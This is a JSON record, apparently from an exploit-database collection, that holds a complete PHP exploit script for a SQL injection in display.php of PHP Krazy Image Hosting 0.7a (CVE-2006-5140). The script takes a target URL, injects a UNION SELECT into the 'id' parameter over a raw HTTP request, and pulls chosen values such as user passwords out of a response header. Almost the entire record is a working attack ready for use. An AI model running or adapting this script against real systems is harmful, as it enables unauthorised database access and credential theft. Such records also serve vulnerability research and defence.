{
  "id": "2456",
  "title": "PHP Krazy Image Hosting 0.7a - &#039;display.php&#039; SQL Injection",
  "cve": "CVE-2006-5140",
  "vuln_type": "sqli",
  "code": "<?\r\n/*****************************************************************\\\r\n|* PHP Krazy Image Host Script (id) Remote SQL Injection Exploit *|\r\n|* Discovered by: Trex                                           *|\r\n|* Solution: http://www.trex-online.net/fixes/display.rar        *|\r\n|* Visit: Trex-Online.net / UnderGround.ag                       *|\r\n\\*****************************************************************/\r\n\r\nerror_reporting(0);\r\n\r\necho \"# PHP Krazy Image Host Script (id) Remote SQL Injection Exploit\\n\";\r\necho \"# Discovered by: Trex\\n\";\r\necho \"# Solution: http://www.trex-online.net/fixes/display.rar\\n\";\r\necho \"# Visit: Trex-Online.net / UnderGround.ag\\n\\n\";\r\necho \"# Usage: $ php \" . $_SERVER['PHP_SELF'] . \" [URL] [PATH] [SELECT] [FROM] [WHERE]\\n\";\r\necho \"# Example: $ php \" . $_SERVER['PHP_SELF'] . \" http://localhost /images/ password users userID=1\\n\\n\";\r\n\r\nif (!$_SERVER['argv'][5])\r\n\tdie();\r\n\r\n$url = parse_url($_SERVER['argv'][1] . $_SERVER['argv'][2]);\r\n\r\n$sql = \"UNION+SELECT+1,1,1,1,\" . $_SERVER['argv'][3] . \",1,1,1+FROM+\" . $_SERVER['argv'][4] . \"+WHERE+\" . $_SERVER['argv'][5] . \"/*\";\r\n\r\necho \"Connecting to \" . $url['host'] . \":80 ... \";\r\n\r\nif (!$fsp = fsockopen($url['host'], 80, $errno, $errstr, $timeout))\r\n\tdie(\"failed.\\nReason: \" . $errno . \" - \" . $errstr);\r\n\r\necho \"done.\\n\\n\";\r\n\r\n$request  = \"HEAD \" . $url['path'] . \"display.php?id=0+\" . $sql . \" HTTP/1.1\\r\\n\";\r\n$request .= \"Host: \" . $url['host'] . \"\\r\\n\";\r\n$request .= \"Connection: Close\\r\\n\\r\\n\";\r\n\r\nfputs($fsp, $request);\r\n\r\nwhile (!feof($fsp)) {\r\n\t$response = fgets($fsp, 4096);\r\n\t$response = explode(\":\", $response, 2);\r\n\r\n\tif (count($response) == 2 && preg_match(\"/Content-Type/\", $response[0]))\r\n\t\t$result = $response[1];\r\n}\r\n\r\nif (preg_match(\"/text\\/html/\", $result))\r\n\techo \"Exploit failed!\";\r\nelse\r\n\techo \"Result: \" . $result;\r\n?>\r\n\r\n# milw0rm.com [2006-09-29]",
  "url": "https://www.exploit-db.com/exploits/2456"
}